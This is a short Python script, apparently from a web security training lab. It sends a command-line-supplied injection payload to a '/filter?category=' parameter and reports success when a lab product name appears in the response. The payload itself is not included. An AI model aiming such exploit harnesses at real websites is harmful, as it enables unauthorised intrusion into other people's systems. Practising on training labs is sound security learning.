import requests
import sys
import urllib3

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#Setting up the proxy
proxies = {'http': 'http://127.0.0.1:8080', 'https' : "http://127.0.0.1:8080"}

#Exploit Function
def exploit_executed(url, payload):
    uri = "/filter?category="
    request = requests.get(url + uri + payload)
    #An item that only exists if exploit was successful
    if "Babbage Web Spray" in request.text:
        return True
    else:
        return False


if __name__ == "__main__":
    #Insuring correct syntax
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        sys.exit(-1)

    #Checking if the exploit worked 
    if exploit_executed(url, payload):
        print("[+] Exploited Successfuly")
    else:
        print("[-] Something went wrong")